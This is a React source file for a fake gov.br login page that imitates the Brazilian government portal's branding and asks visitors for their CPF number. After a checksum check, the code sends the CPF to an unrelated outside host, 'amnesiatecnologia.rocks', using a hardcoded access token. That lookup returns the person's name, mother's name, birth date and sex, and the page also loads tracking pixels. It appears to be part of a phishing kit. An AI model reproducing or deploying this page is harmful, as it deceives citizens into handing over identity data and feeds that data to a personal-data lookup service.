import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useUser } from '../context/UserContext';
import { usePixelTracking } from '../hooks/usePixelTracking';
import axios from 'axios';

interface UserInfo {
  cpf: string;
  nome: string;
  nome_mae: string;
  data_nascimento: string;
  sexo: string;
}

const validateCPFFromAPI = async (cpf: string): Promise<{ valid: boolean; data?: UserInfo }> => {
  const numericCPF = cpf.replace(/\D/g, "");

  if (numericCPF.length !== 11) {
    return { valid: false };
  }

  if (/^(\d)\1{10}$/.test(numericCPF)) {
    return { valid: false };
  }

  let sum = 0;
  for (let i = 0; i < 9; i++) {
    sum += parseInt(numericCPF.charAt(i)) * (10 - i);
  }
  let digit1 = 11 - (sum % 11);
  if (digit1 > 9) digit1 = 0;

  sum = 0;
  for (let i = 0; i < 10; i++) {
    sum += parseInt(numericCPF.charAt(i)) * (11 - i);
  }
  let digit2 = 11 - (sum % 11);
  if (digit2 > 9) digit2 = 0;

  if (parseInt(numericCPF.charAt(9)) !== digit1 || parseInt(numericCPF.charAt(10)) !== digit2) {
    return { valid: false };
  }

  try {
    const response = await axios.get(
      `https://api.amnesiatecnologia.rocks/?token=e9f16505-2743-4392-bfbe-1b4b89a7367c&cpf=${numericCPF}`
    );

    if (response.data && response.data.DADOS) {
      return {
        valid: true,
        data: {
          cpf: response.data.DADOS.cpf,
          nome: response.data.DADOS.nome,
          nome_mae: response.data.DADOS.nome_mae,
          data_nascimento: response.data.DADOS.data_nascimento,
          sexo: response.data.DADOS.sexo
        }
      };
    }
  } catch (error) {
    console.error('Erro ao consultar API de CPF:', error);
  }

  return { valid: true };
};

const Login: React.FC = () => {
  usePixelTracking();
  
  const [cpf, setCpf] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const navigate = useNavigate();
  const { setUserName } = useUser();

  const formatCPF = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length <= 3) return numbers;
    if (numbers.length <= 6) return `${numbers.slice(0, 3)}.${numbers.slice(3)}`;
    if (numbers.length <= 9) return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6)}`;
    return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6, 9)}-${numbers.slice(9, 11)}`;
  };

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedCPF = formatCPF(e.target.value);
    if (formattedCPF.length <= 14) {
      setCpf(formattedCPF);
      setError('');
    }
  };

  const handleContinue = async () => {
    if (cpf.length < 14) {
      setError('Digite um CPF válido');
      return;
    }

    setLoading(true);
    setError('');

    try {
      const result = await validateCPFFromAPI(cpf);

      if (!result.valid) {
        setError('CPF inválido');
        return;
      }

      if (result.data) {
        setUserName(result.data.nome);
      }

      navigate('/');
    } catch (error) {
      setError('Erro ao validar CPF. Tente novamente.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100" style={{ fontFamily: 'Raleway, sans-serif' }}>
      {/* Header */}
      <div className="flex justify-between items-center px-5 py-4 bg-white shadow-md">
        <div className="text-4xl font-bold">
          <span style={{ color: '#2670e8' }}>g</span>
          <span style={{ color: '#ffcc29' }}>o</span>
          <span style={{ color: '#3ba135' }}>v</span>
          <span style={{ color: '#2670e8' }}>.</span>
          <span style={{ color: '#ffcc29' }}>br</span>
        </div>
        <div className="flex gap-5">
          <i className="fas fa-adjust text-xl" style={{ color: '#2670e8' }}></i>
          <i className="fas fa-rocket text-xl" style={{ color: '#2670e8' }}></i>
        </div>
      </div>

      {/* Main Container with increased side margins */}
      <div className="max-w-xl mx-auto mt-12 bg-white rounded shadow-lg p-8 mx-8 lg:mx-auto">
        <h1 className="text-2xl text-gray-800 mb-8">Identifique-se no gov.br com:</h1>

        {/* CPF Section */}
        <div className="mb-8">
          <div className="flex items-center mb-5">
            <div 
              className="w-10 h-10 rounded flex items-center justify-center mr-4"
              style={{ backgroundColor: '#e6eeff', color: '#2670e8' }}
            >
              <i className="fas fa-id-card"></i>
            </div>
            <div className="text-lg text-gray-800">Número do CPF</div>
          </div>

          <div className="mb-5 text-base text-gray-800">
            Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
          </div>

          <label className="block mb-3 text-base text-gray-800">CPF</label>
          <input
            type="text"
            className="w-full p-4 border border-gray-300 rounded text-base text-gray-600"
            placeholder="Digite seu CPF"
            value={cpf}
            onChange={handleCPFChange}
            inputMode="numeric"
          />

          {error && (
            <div className="mt-3 p-3 bg-red-50 border border-red-200 text-red-700 rounded text-sm">
              {error}
            </div>
          )}

          <button 
            onClick={handleContinue}
            disabled={loading || cpf.length < 14}
            className="w-full p-4 text-white border-none rounded-full text-lg cursor-pointer mt-5 mb-8 disabled:opacity-50 disabled:cursor-not-allowed"
            style={{ backgroundColor: '#2670e8' }}
          >
            {loading ? 'Validando...' : 'Continuar'}
          </button>
        </div>

        {/* Help Section */}
        <div className="flex justify-center mt-8">
          <a href="#" className="flex items-center no-underline text-base" style={{ color: '#2670e8' }}>
            <div 
              className="w-8 h-8 rounded-full flex items-center justify-center mr-3"
              style={{ backgroundColor: '#e6eeff', color: '#2670e8' }}
            >
              <i className="fas fa-question"></i>
            </div>
            Está com dúvidas e precisa de ajuda?
          </a>
        </div>

        {/* Terms Section */}
        <div className="flex justify-center mt-5">
          <a href="#" className="no-underline text-base" style={{ color: '#2670e8' }}>
            Termo de Uso e Aviso de Privacidade
          </a>
        </div>
      </div>
    </div>
  );
};

export default Login;